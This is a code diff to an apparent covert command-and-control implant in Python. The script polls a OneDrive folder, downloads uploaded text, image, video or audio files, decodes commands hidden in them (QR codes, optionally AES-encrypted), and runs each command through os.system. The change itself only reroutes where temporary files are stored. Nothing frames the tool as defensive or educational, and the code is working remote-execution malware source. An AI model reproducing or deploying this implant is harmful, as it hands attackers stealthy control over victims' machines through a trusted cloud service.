@@ -46,8 +46,9 @@ def download_file(file_url, downloaded_file_path):
 				f.write(chunk)
 
 
-def analyze(downloaded_file):
+def analyze(downloaded_file, temp_folder):
 	data_type = config.data_type
+	commands = []
 	if data_type == "text" or data_type == "text_encrypted":
 		if not downloaded_file.endswith(".txt"):
 			now = datetime.datetime.now()
@@ -69,9 +70,9 @@ def analyze(downloaded_file):
 			if debug: print("[%02d:%02d:%02d] Incorrect extension. Expected: %s"%(now.hour,now.minute,now.second,".avi"))
 		else:
 			if data_type == "video":
-				commands = read_file.read_video("qr", downloaded_file, "/tmp/")
+				commands = read_file.read_video("qr", downloaded_file, temp_folder)
 			elif data_type == "video_encrypted":
-				commands = read_file.read_video("qr_aes", downloaded_file, "/tmp/")
+				commands = read_file.read_video("qr_aes", downloaded_file, temp_folder)
 	elif data_type == "audio" or data_type == "audio_encrypted":
 		if not downloaded_file.endswith(".wav"):
 			now = datetime.datetime.now()
@@ -80,7 +81,6 @@ def analyze(downloaded_file):
 			commands = read_file.read_audio(data_type, downloaded_file)
 	else:
 		if debug: print("[%02d:%02d:%02d] Unexpected data_type value: %s"%(now.hour,now.minute,now.second,data_type))
-		commands = []
 	return commands
 
 
@@ -93,17 +93,17 @@ def execute_commands(commands):
 		os.system(cmd_)
 
 
-def wait_for_upload(folder_id, next_id, authkey):
+def wait_for_upload(folder_id, next_id, authkey, temp_folder):
 	delay_seconds = config.delay_seconds
 	data_type = config.data_type
 	if data_type == "text" or data_type == "text_encrypted":
-		downloaded_file = config.temp_folder + "/test.txt"
+		downloaded_file = temp_folder + "/test.txt"
 	elif data_type == "image" or data_type == "image_encrypted":
-		downloaded_file = config.temp_folder + "/test.png"
+		downloaded_file = temp_folder + "/test.png"
 	elif data_type == "video" or data_type == "video_encrypted":
-		downloaded_file = config.temp_folder + "/test.avi"
+		downloaded_file = temp_folder + "/test.avi"
 	elif data_type == "audio" or data_type == "audio_encrypted":
-		downloaded_file = config.temp_folder + "/test.wav"
+		downloaded_file = temp_folder + "/test.wav"
 	now = datetime.datetime.now()
 	if debug: print("[%02d:%02d:%02d] Waiting %s seconds..."%(now.hour,now.minute,now.second,delay_seconds))
 	while True:
@@ -115,7 +115,7 @@ def wait_for_upload(folder_id, next_id, authkey):
 		if "error" not in json_file_data:	
 			file_url = json_file_data['@content.downloadUrl']
 			download_file(file_url, downloaded_file)
-			commands = analyze(downloaded_file)
+			commands = analyze(downloaded_file, temp_folder)
 			execute_commands(commands)
 			next_id = str(int(next_id)+1)
 			os.remove(downloaded_file)
@@ -127,10 +127,11 @@ def wait_for_upload(folder_id, next_id, authkey):
 
 
 def main():
+	temp_folder = "."
 	url = config.onedrive_folder
 	folder_id, first_item_id, authkey = parse_vals(url)
 	next_id = get_next_id(folder_id, first_item_id, authkey)
-	wait_for_upload(folder_id, next_id, authkey)
+	wait_for_upload(folder_id, next_id, authkey, temp_folder)
 
 
 if __name__== "__main__":
